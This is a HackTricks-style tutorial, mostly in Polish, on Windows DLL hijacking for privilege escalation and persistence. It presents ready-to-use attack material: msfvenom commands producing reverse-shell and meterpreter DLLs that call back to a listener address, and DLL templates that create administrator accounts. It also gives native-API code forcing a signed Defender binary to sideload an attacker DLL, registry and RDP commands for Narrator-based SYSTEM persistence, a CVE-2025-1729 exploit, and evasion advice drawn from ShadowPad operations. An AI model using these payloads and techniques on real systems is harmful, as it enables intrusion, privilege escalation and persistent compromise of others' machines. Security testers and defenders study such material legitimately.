# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na zmanipulowaniu zaufanej aplikacji tak, aby załadowała złośliwy DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection, and Side-Loading**. Jest wykorzystywany głównie do wykonania kodu, osiągnięcia persistence oraz, rzadziej, eskalacji uprawnień. Pomimo że tutaj skupiamy się na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Typowe techniki

Stosuje się kilka metod hijackingu DLL, z różną skutecznością zależnie od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Zamiana prawidłowego DLL na złośliwy, opcjonalnie używając DLL Proxying, aby zachować funkcjonalność oryginalnego DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwego DLL w ścieżce wyszukiwania przed prawidłowym, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Stworzenie złośliwego DLL, który aplikacja załaduje, myśląc, że to wymagany, nieistniejący DLL.
4. **DLL Redirection**: Modyfikacja parametrów wyszukiwania, takich jak %PATH% lub pliki .exe.manifest / .exe.local, aby skierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Zastąpienie prawidłowego DLL złośliwym odpowiednikiem w katalogu WinSxS, metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwego DLL w katalogu kontrolowanym przez użytkownika wraz ze skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

> [!TIP]
> Aby zobaczyć krok po kroku łańcuch łączący HTML staging, konfiguracje AES-CTR i implanty .NET na szczycie DLL sideloadingu, przejrzyj poniższy workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących DLL

Najczęstszym sposobem znalezienia brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals i **ustawienie** **następujących 2 filtrów**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i pokazanie tylko **File System Activity**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących DLL ogólnie**, zostaw to uruchomione na kilka **sekund**.\
Jeśli szukasz **brakującego DLL w konkretnym executable**, powinieneś ustawić **inny filtr, np. "Process Name" "contains" `<exec name>`, uruchomić go i zatrzymać przechwytywanie zdarzeń**.

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, najlepszą szansą jest możliwość **zapisania DLL**, który proces z wyższymi uprawnieniami będzie próbował załadować, w jednym z miejsc, gdzie ten DLL będzie szukany. W efekcie będziemy mogli **zrzucić** DLL w folderze, który jest przeszukiwany przed folderem zawierającym **oryginalny DLL** (rzadki przypadek), lub zapisać w folderze, w którym DLL ma być szukany, jeśli oryginalny DLL nie istnieje w żadnym folderze.

### Kolejność wyszukiwania DLL

W [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **można znaleźć szczegóły dotyczące ładowania DLL.**

Aplikacje Windows wyszukują DLL, podążając za zestawem **wstępnie zdefiniowanych ścieżek wyszukiwania**, w określonej kolejności. Problem DLL hijackingu pojawia się, gdy złośliwy DLL zostanie strategicznie umieszczony w jednym z tych katalogów, tak aby został załadowany przed autentycznym DLL. Rozwiązaniem jest zapewnienie, że aplikacja używa ścieżek absolutnych przy odwoływaniu się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL na systemach 32-bitowych**:

1. Katalog, z którego załadowano aplikację.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę tego katalogu.(_C:\Windows\System32_)
3. 16-bitowy katalog systemowy. Nie istnieje funkcja zwracająca ścieżkę tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Zauważ, że nie obejmuje to ścieżki per-aplikacja określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy obliczaniu ścieżki wyszukiwania DLL.

To jest **domyślna** kolejność wyszukiwania ze włączonym **SafeDllSearchMode**. Gdy jest wyłączony, bieżący katalog przesuwa się na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** i ustaw ją na 0 (domyślnie włączone).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec, zwróć uwagę, że **DLL może być ładowany podając ścieżkę absolutną zamiast samej nazwy**. W takim wypadku DLL będzie **przeszukiwany tylko w tej ścieżce** (jeśli DLL ma jakieś zależności, one będą wyszukiwane zgodnie z regułami – jako ładowane po nazwie).

Istnieją inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj opisywał.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo tworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Dostarczając tu katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje importowany DLL po nazwie (bez ścieżki absolutnej i nie używając flag bezpiecznego ładowania), może zostać zmuszony do załadowania złośliwego DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowy DllPath wskazujący na folder kontrolowany przez Ciebie (np. katalog, w którym znajduje się twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy binarka docelowa rozwiąże DLL po nazwie, loader skonsultuje dostarczony DllPath podczas rozwiązywania, umożliwiając niezawodne sideloading nawet gdy złośliwy DLL nie jest współlokowany z docelowym EXE.

Uwagi/ograniczenia
- To wpływa na tworzony proces potomny; różni się od SetDllDirectory, który wpływa tylko na bieżący proces.
- Proces docelowy musi importować lub wywołać LoadLibrary dla DLL po nazwie (bez ścieżki absolutnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane ścieżki absolutne nie mogą być hijackowane. Forwarded exports i SxS mogą zmieniać priorytet.

Minimalny przykład w C (ntdll, wide strings, uproszczone obsługi błędów):

<details>
<summary>Pełny przykład w C: wymuszanie DLL sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijacking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich katalogów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz też sprawdzić importy pliku wykonywalnego oraz eksporty DLL za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **wykorzystać Dll Hijacking do eskalacji uprawnień** with permissions to write in a **folderze System Path** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze w system PATH.\
Inne przydatne zautomatyzowane narzędzia do wykrycia tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll_.

### Przykład

Jeśli znajdziesz scenariusz podatny na wykorzystanie, jedną z najważniejszych rzeczy do skutecznego exploitowania będzie **utworzenie dll, który eksportuje przynajmniej wszystkie funkcje, które wykonywalny będzie z niego importować**. W każdym razie, zauważ, że Dll Hijacking przydaje się do [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub do[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Możesz znaleźć przykład **jak stworzyć prawidłowy dll** w tym opracowaniu dotyczącym dll hijacking skupionym na uruchamianiu: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **następnej sekcji**n możesz znaleźć kilka **podstawowych kodów dll**, które mogą być użyteczne jako **szablony** lub do stworzenia **dll eksportującego nieobowiązkowe funkcje**.

## **Tworzenie i kompilowanie Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll, który potrafi **wykonać twój złośliwy kod po załadowaniu**, ale także **udostępniać** i **działać** zgodnie z oczekiwaniami, **przekazując wszystkie wywołania do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz faktycznie **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz proxify oraz **wygenerować proxified dll** albo **wskazać Dll** i **wygenerować proxified dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własne

Zwróć uwagę, że w wielu przypadkach Dll, które skompilujesz, musi **eksportować kilka funkcji**, które zostaną załadowane przez proces ofiary; jeśli te funkcje nie istnieją, **binary nie będzie w stanie ich załadować** i **exploit zakończy się niepowodzeniem**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL w C z punktem wejścia uruchamianym w wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe wciąż sprawdza przewidywalny, specyficzny dla języka plik localization DLL przy starcie, który może zostać hijacked w celu arbitrary code execution i persistence.

Key facts
- Ścieżka sprawdzania (aktualne buildy): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (starsze buildy): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli zapisywalny, kontrolowany przez atakującego plik DLL znajduje się w ścieżce OneCore, zostanie on załadowany i wykona się `DllMain(DLL_PROCESS_ATTACH)`. Eksporty nie są wymagane.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalny DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC — cisza
- Naiwne hijackowanie spowoduje mówienie/podświetlenie UI. Aby pozostać cicho, podczas attach enumeruj wątki Narrator, otwórz wątek główny (`OpenThread(THREAD_SUSPEND_RESUME)`) i `SuspendThread` go; kontynuuj we własnym wątku. Zobacz PoC po pełny kod.

Trigger and persistence via Accessibility configuration
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Dzięki powyższemu, uruchomienie Narrator załaduje zasadzony DLL. Na secure desktop (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Pozwól na classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się przez RDP do hosta; na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; twój DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie zatrzymuje się po zamknięciu sesji RDP — inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wbudowany wpis rejestru Accessibility Tool (AT) (np. CursorIndicator), edytować go tak, aby wskazywał dowolny binary/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. To umożliwia proxy dowolne wykonanie w ramach Accessibility framework.

Uwagi
- Zapis w `%windir%\System32` i zmiana wartości HKLM wymaga uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; nie są potrzebne żadne eksporty.

## Studium przypadku: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ten przypadek demonstruje **Phantom DLL Hijacking** w TrackPoint Quick Menu firmy Lenovo (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.

### Szczegóły podatności

- **Component**: `TPQMAssistant.exe` znajdujący się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamiane codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Directory Permissions**: zapisywalne przez `CREATOR OWNER`, co pozwala lokalnym użytkownikom na umieszczanie dowolnych plików.
- **DLL Search Behavior**: Próbuje najpierw załadować `hostfxr.dll` z katalogu roboczego i loguje "NAME NOT FOUND" jeśli brak, co wskazuje na pierwszeństwo wyszukiwania w katalogu lokalnym.

### Exploit Implementation

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakujący DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako zwykły użytkownik, umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj na uruchomienie zadania zaplanowanego o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli administrator jest zalogowany w momencie wykonania zadania, złośliwy DLL uruchomi się w sesji administratora na poziomie medium integrity.
4. Zastosuj standardowe UAC bypass techniques, aby uzyskać uprawnienia SYSTEM z poziomu medium integrity.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Aktorzy zagrożeń często łączą MSI-based droppers z DLL side-loading, aby uruchamiać payloady w kontekście zaufanego, podpisanego procesu.

Chain overview
- Użytkownik pobiera MSI. CustomAction uruchamia się cicho podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), rekonstruując kolejną fazę z osadzonych zasobów.
- Dropper zapisuje wiarygodny, podpisany EXE oraz złośliwy DLL w tym samym katalogu (przykładowa para: wsc_proxy.exe podpisany przez Avast + wsc.dll kontrolowany przez atakującego).
- Gdy podpisany EXE jest uruchamiany, Windows DLL search order ładuje wsc.dll z katalogu roboczego jako pierwszy, wykonując kod atakującego pod podpisanym procesem (ATT&CK T1574.001).

MSI analysis (what to look for)
- Tabela CustomAction:
- Szukaj wpisów, które uruchamiają executables lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication uruchamiający osadzony plik w tle.
- W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w CAB MSI:
- Ekstrakcja administracyjna: msiexec /a package.msi /qb TARGETDIR=C:\out
- Lub użyj lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez VBScript CustomAction. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading przy użyciu wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: prawidłowo podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z własnego katalogu.
- wsc.dll: DLL atakującego. Jeśli nie są wymagane żadne konkretne exports, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekaż wymagane exports do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Dla wymagań eksportu użyj proxying framework (np. DLLirant/Spartacus) do wygenerowania forwarding DLL, który również wykonuje twój payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez host binary. Jeśli host używa ścieżek bezwzględnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na priorytet i należy je uwzględnić przy wyborze host binary i zestawu eksportów.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point opisał, jak Ink Dragon wdraża ShadowPad, używając **three-file triad**, aby wtapiać się w legitne oprogramowanie, jednocześnie utrzymując główny payload zaszyfrowany na dysku:

1. **Signed host EXE** – vendorów takich jak AMD, Realtek lub NVIDIA się nadużywa (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę wykonywalnego, by wyglądał jak Windows binary (np. `conhost.exe`), ale podpis Authenticode pozostaje ważny.
2. **Malicious loader DLL** – upuszczany obok EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL jest zwykle MFC binary zobfuskowany za pomocą ScatterBrain framework; jego jedynym zadaniem jest zlokalizować zaszyfrowany blob, odszyfrować go i reflectively map ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po memory-mapping odszyfrowanego payloadu loader usuwa plik TMP, aby zniszczyć dowody śledcze.

Tradecraft notes:

* Zmiana nazwy podpisanego EXE (przy zachowaniu oryginalnego `OriginalFileName` w nagłówku PE) pozwala mu podszyć się pod Windows binary, zachowując jednocześnie podpis dostawcy — naśladuj praktykę Ink Dragon polegającą na upuszczaniu binarek wyglądających jak `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ wykonywalny plik pozostaje trusted, większość mechanizmów allowlisting wymaga jedynie, by twój malicious DLL znajdował się obok niego. Skoncentruj się na dostosowaniu loader DLL; podpisany parent zazwyczaj może uruchomić się bez zmian.
* ShadowPad’s decryptor oczekuje, że TMP blob będzie obok loadera i będzie writable, aby mógł wyzerować plik po mappingu. Utrzymuj katalog zapisywalny aż do załadowania payloadu; gdy payload znajdzie się już w pamięci, plik TMP można bezpiecznie usunąć ze względów OPSEC.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
